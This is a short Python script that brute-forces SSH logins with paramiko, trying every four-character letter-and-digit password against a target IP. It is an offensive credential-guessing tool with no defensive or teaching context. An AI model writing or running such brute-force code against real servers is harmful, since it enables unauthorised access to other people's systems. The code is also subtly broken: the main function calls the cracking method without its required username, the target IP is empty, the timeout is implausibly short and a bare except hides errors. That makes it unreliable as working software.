import itertools as it
import string
import paramiko

def create_client():
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    return client

class Brutes:
    def __init__(self, charset, length, ip):
        self.charset = charset
        self.length = length
        self.ip = ip

    def crackit(self, username):
        client = create_client()
        for guess in self.guesses():
            client = create_client()
            try:
                client.connect(self.ip, username=username, password=guess, timeout=0.01)
                return guess
            except:
                pass
            finally:
                client.close()

    def guesses(self):
        for guess in it.product(self.charset, repeat=self.length):
            yield ''.join(guess)

def main():
    ip = ''
    charset = string.ascii_letters + string.digits
    brute = Brutes(charset, 4, ip)
    password = brute.crackit()
    if password:
        print('Fount {}'.format(password))

if __name__ == '__main__':
    main()
